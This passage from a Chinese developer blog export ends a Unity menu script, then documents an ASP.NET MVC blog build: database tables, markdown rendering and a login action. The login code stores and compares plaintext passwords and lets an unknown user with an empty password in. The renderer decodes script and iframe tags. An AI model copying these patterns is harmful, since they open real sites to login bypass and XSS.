class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Option</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> chose = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> Transform onePlayer;</span><br><span class="line">    <span class="keyword">public</span> Transform twoPlayer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update is called once per frame</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//获得输入</span></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.W))</span><br><span class="line">        &#123;</span><br><span class="line">            chose = <span class="number">0</span>;</span><br><span class="line">            transform.position = onePlayer.position;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.S))</span><br><span class="line">        &#123;</span><br><span class="line">            chose = <span class="number">1</span>;</span><br><span class="line">            transform.position = twoPlayer.position;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//更换场景</span></span><br><span class="line">        <span class="keyword">if</span> (chose == <span class="number">0</span> &amp;&amp; Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            SceneManager.LoadScene(<span class="string">&quot;GameScene&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (chose == <span class="number">1</span> &amp;&amp; Input.GetKeyDown(KeyCode.Space))</span><br><span class="line">        &#123;</span><br><span class="line">            SceneManager.LoadScene(<span class="string">&quot;GameScene&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="添加音效"><a href="#添加音效" class="headerlink" title="添加音效"></a>添加音效</h2><p>使用AudioClip与AudioSource组件联动即可，非常简单。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 项目 </tag>
            
            <tag> 开发文档 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASP.NET博客系统&amp;网抑云项目文档</title>
      <link href="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3/"/>
      <url>/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="ASP-NET博客系统项目文档"><a href="#ASP-NET博客系统项目文档" class="headerlink" title="ASP.NET博客系统项目文档"></a>ASP.NET博客系统项目文档</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想做这个东西很久了，主要是想尝试一下MVC的网站开发模式，看看网站从无到有的开发的流程。今天开始可以开始自己实现一个了，我会把开发的过程记在这个文档里面，留作以后的参考。</p><blockquote><p>注:</p><ol><li>本系统暂时只会实现个人发表博客，登录功能主要是用于发表文章更新时用的，相当于一个后台的admin管理界面。</li></ol></blockquote><h2 id="一、前端布局"><a href="#一、前端布局" class="headerlink" title="一、前端布局"></a>一、前端布局</h2><p>这里我主要想参考的是下面这个hexo的博客的布局来搞，就是一个初级的练手的项目，不想搞得太深，没什么必要也。</p><p><img src="/2021/10/04/ASP-NET%E5%8D%9A%E5%AE%A2%E7%B3%BB%E7%BB%9F%E9%A1%B9%E7%9B%AE%E6%96%87%E6%A1%A3//image-20211004210733904.png"></p><p>就是最上面是一个导航栏，再往下一点有个轮播图，再向下是个三栏式的博客，左边和右边是小工具的地方，中间放文章的标题与摘要，可以设置封面，不设置封面的话自动加载默认的图片。</p><h2 id="二、数据库设置"><a href="#二、数据库设置" class="headerlink" title="二、数据库设置"></a>二、数据库设置</h2><p>两个表，一个表中存放用户的相关信息，另一个表中存放发表的博客文章的相关信息。</p><h3 id="1-用户信息表"><a href="#1-用户信息表" class="headerlink" title="1. 用户信息表"></a>1. 用户信息表</h3><p>用户名、密码、邮箱</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[userinfo]</span><br><span class="line">(</span><br><span class="line">[Id] <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY, </span><br><span class="line">    [username] <span class="type">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>, </span><br><span class="line">    [password] <span class="type">VARCHAR</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>, </span><br><span class="line">    [email] <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="2-文章相关表"><a href="#2-文章相关表" class="headerlink" title="2. 文章相关表"></a>2. 文章相关表</h3><p>文章id(唯一)、文章cover、文章标题、文章路径(并不准备把文章存在数据库里面)。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> [dbo].[ArticleInfo] (</span><br><span class="line">    [Id]             <span class="type">INT</span>            <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [articlecover]   NVARCHAR (<span class="number">200</span>) <span class="keyword">COLLATE</span> SQL_Latin1_General_CP1_CI_AS <span class="keyword">NULL</span>,</span><br><span class="line">    [articletitle]   NVARCHAR (<span class="number">50</span>)  <span class="keyword">COLLATE</span> SQL_Latin1_General_CP1_CI_AS <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [articlepath]    NVARCHAR (<span class="number">200</span>) <span class="keyword">COLLATE</span> SQL_Latin1_General_CP1_CI_AS <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [articlesummary] NVARCHAR (<span class="number">200</span>) <span class="keyword">COLLATE</span> SQL_Latin1_General_CP1_CI_AS <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    [articlewordnum] <span class="type">INT</span>            <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    [articlesticky]  <span class="type">INT</span>            <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    [articleupdatetime] DATETIME <span class="keyword">NULL</span>, </span><br><span class="line">    [articlelike] <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>, </span><br><span class="line">    <span class="keyword">CONSTRAINT</span> [PK_dbo.ArticleInfo] <span class="keyword">PRIMARY</span> KEY CLUSTERED ([Id] <span class="keyword">ASC</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><blockquote><p>文章标题不能包含<code>#</code>、<code>，</code>以及windows命名文件时不允许出现的字符</p></blockquote><h2 id="三、文章显示"><a href="#三、文章显示" class="headerlink" title="三、文章显示"></a>三、文章显示</h2><p>对文章的显示我用的时一个js的一个插件，在github上面找的。</p><p><a href="https://github.com/markedjs/marked">https://github.com/markedjs/marked</a></p><p>可以直接引入script</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--调用markdown渲染脚本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/marked/marked.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在js中调用使用的方法是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>).<span class="property">innerHTML</span> = <span class="title function_">marked</span>(<span class="string">&#x27;# Marked in the browser\n\nRendered by **marked**.&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是这个也许有点不美观，后期可能会换个好看的插件，现在就这了。</p><h3 id="1-把读文章做成接口"><a href="#1-把读文章做成接口" class="headerlink" title="1. 把读文章做成接口"></a>1. 把读文章做成接口</h3><p>这里我把从文件里面读取文章的功能做成了一个接口，把接口就写在了HomeController里面了，未来如果有需要的话，可能会把接口挪到专门的ApiController里面，做成一个专门的接口控制器</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//API</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">APIGetArticle</span>(<span class="params"><span class="built_in">int</span>? id</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AticleInfo articleInfo = db.AticleInfo.Find(id);</span><br><span class="line">    <span class="built_in">string</span> path = articleInfo.articlepath;</span><br><span class="line">    path = Request.MapPath(path);  <span class="comment">//转换为相对路径</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> readContents = System.IO.File.ReadAllText(path, Encoding.UTF8);</span><br><span class="line">    <span class="keyword">return</span> Content(readContents);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-换用更方便的插件"><a href="#2-换用更方便的插件" class="headerlink" title="2. 换用更方便的插件"></a>2. 换用更方便的插件</h3><p>​插件原来用的是<code>marked</code>，现在换成了<code>editor.md</code>，原先的也能用，但是这个更方便罢了，使用方法：</p><p>html文件内容如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--调用markdown渲染脚本，lib文件夹调用与文章编辑时稍有不同--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;~/Content/editormd/css/editormd.css&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/marked.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/prettify.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/raphael.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/underscore.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/sequence-diagram.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/flowchart.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/lib/jquery.flowchart.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/editormd.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;blog_id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;@ViewBag.id&quot;</span>&gt;</span> <span class="comment">&lt;!--存放文章id--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;editormd-content&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- textarea 加载Markdown内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;markdownarea&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js文件内容如下，其中<code>res是markdown的内容</code>，这样就能直接转了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//刷新文章显示内容</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">FlushArtile</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    $(<span class="string">&quot;#editormd-content&quot;</span>).<span class="title function_">html</span>(<span class="string">&#x27;&lt;textarea id=&quot;markdownarea&quot; style=&quot;display:none;&quot;&gt;&lt;/textarea&gt;&#x27;</span>);</span><br><span class="line">    $(<span class="string">&quot;#markdownarea&quot;</span>).<span class="title function_">val</span>(res);<span class="comment">//将需要转换的内容加到转换后展示容器的textarea隐藏标签中</span></span><br><span class="line">    <span class="comment">//markdownToHTML 将markdown文本转换为HTML</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Editor</span> = editormd.<span class="title function_">markdownToHTML</span>(<span class="string">&quot;editormd-content&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">htmlDecode</span>: <span class="string">&quot;style,script,iframe&quot;</span>,  <span class="comment">// you can filter tags decode</span></span><br><span class="line">        <span class="comment">//markdown: markdown,//+ &quot;\r\n&quot; + $(&quot;#append-test&quot;).text(),</span></span><br><span class="line">        <span class="comment">//htmlDecode      : true,       // 开启 HTML 标签解析，为了安全性，默认不开启</span></span><br><span class="line">        <span class="comment">//toc             : false,</span></span><br><span class="line">        <span class="comment">//tocContainer    : &quot;#custom-toc-container&quot;, // 自定义 ToC 容器层</span></span><br><span class="line">        <span class="comment">//gfm             : false,</span></span><br><span class="line">        <span class="comment">//tocDropdown     : true,</span></span><br><span class="line">        <span class="comment">// markdownSourceCode : true, // 是否保留 Markdown 源码，即是否删除保存源码的 Textarea 标签</span></span><br><span class="line">        <span class="attr">emoji</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">taskList</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">//tocm: true, //对目录解析</span></span><br><span class="line">        <span class="attr">tex</span>: <span class="literal">true</span>,  <span class="comment">// 默认不解析</span></span><br><span class="line">        <span class="attr">flowChart</span>: <span class="literal">true</span>,  <span class="comment">// 默认不解析</span></span><br><span class="line">        <span class="attr">sequenceDiagram</span>: <span class="literal">true</span>,  <span class="comment">// 默认不解析  </span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-editor-md将标题嵌入外部div内"><a href="#3-editor-md将标题嵌入外部div内" class="headerlink" title="3. editor.md将标题嵌入外部div内"></a>3. <code>editor.md</code>将标题嵌入外部div内</h3><p>​我把marked换成editor.md的另一个原因就是这个插件的标题功能非常棒，省的我再去找别的插件了。</p><h2 id="四、文章撰写"><a href="#四、文章撰写" class="headerlink" title="四、文章撰写"></a>四、文章撰写</h2><p>​使用插件<code>editormd</code>，这里有两种选择，第一种是把editor组件的代码下载到本地，第二就是使用在线的镜像，这里为了稳定采用第一种方案。</p><p>​先把代码下载下来，<a href="https://pandao.github.io/editor.md/">下载地址</a>，然后把里面的文件解压到一个文件夹里面，文件夹这里我命名为了editormd，因为Script文件夹里面的文件太多了，非常讨厌，所以这里我把这个插件放在了Content目录下面了。</p><p>​使用方法也很简单，这里直接把他这个插件的官方网站上的代码修改一下即可使用到我们的ASP项目</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">@&#123;</span><br><span class="line">    Layout = &quot;~/Views/Shared/_AdminLayout.cshtml&quot;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../Content/editormd/css/editormd.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/1.11.3/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;~/Content/editormd/editormd.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        $(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> editor = <span class="title function_">editormd</span>(<span class="string">&quot;editor&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// width  : &quot;100%&quot;,</span></span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// height : &quot;100%&quot;,</span></span></span><br><span class="line"><span class="language-javascript">                <span class="attr">path</span>: <span class="string">&quot;../Content/editormd/lib/&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;editor&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line">            ### 关于 Editor.md</span><br><span class="line">            **Editor.md** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。</span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="五、权限鉴别"><a href="#五、权限鉴别" class="headerlink" title="五、权限鉴别"></a>五、权限鉴别</h2><p>​终于写到鉴权的部分了，这个是网站的重中之重啊，稍不注意就是个高危漏洞。。。</p><p>​这里我准备采取ASP的cookie的鉴权方式，并且设定一个cookie的过期时间，也是为了防止部分xss和ssrf。emmm，这个鉴权的第一个部分呢，就是login的那里了，肯定是要在这里设置初始的cookie的，但是先是需要处理login是否成功。</p><h3 id="1-登录判定-确认密码"><a href="#1-登录判定-确认密码" class="headerlink" title="1. 登录判定(确认密码)"></a>1. 登录判定(确认密码)</h3><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ActionResult <span class="title">Login</span>(<span class="params"><span class="built_in">string</span> username, <span class="built_in">string</span> password</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> truepass = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> pass <span class="keyword">in</span> db.userinfo.Where(user =&gt; user.username == username))</span><br><span class="line">    &#123;</span><br><span class="line">        truepass = pass.password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (password == truepass)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> page = Url.Action(<span class="string">&quot;Index&quot;</span>, <span class="string">&quot;Admin&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> Redirect(page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ViewBag.IsLoginError = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">return</span> View();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里设置了一个<code>ViewBag.IsLoginError</code>的值，代表的是是否登陆失败，true表示登陆失败，当登录失败时，html上面做出一个提示，代码如下。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;.alert&quot;</span>).<span class="title function_">ready</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;.alert&quot;</span>).<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">3000</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> timeVal = <span class="number">3</span>;</span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;small&quot;</span>).<span class="title function_">ready</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> timer = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="string">&quot;small&quot;</span>).<span class="title function_">text</span>(--timeVal + <span class="string">&quot; 秒后消失&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (timeVal &lt;= <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">clearInterval</span>(timer);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@&#123;</span><br><span class="line">    if (ViewBag.IsLoginError != null)</span><br><span class="line">    &#123;</span><br><span class="line">        if (ViewBag.IsLoginError)</span><br><span class="line">        &#123;</span><br><span class="line">            ViewBag.IsLoginError = false;</span><br><span class="line">            <span class="comment">&lt;!--登陆失败--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-danger&quot;</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center; margin-bottom: -74.4667px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toast-header&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">&quot;mr-auto text-primary&quot;</span>&gt;</span>登陆失败<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">small</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>3 秒后消失<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ml-2 mb-1 close&quot;</span> <span class="attr">data-dismiss</span>=<span class="string">&quot;alert&quot;</span>&gt;</span>×<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toast-body&quot;</span>&gt;</span></span><br><span class="line">                    密码错误，请检查你的用户名和密码</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-权限维持-使用Cookie"><a href="#2-权限维持-使用Cookie" class="headerlink" title="2. 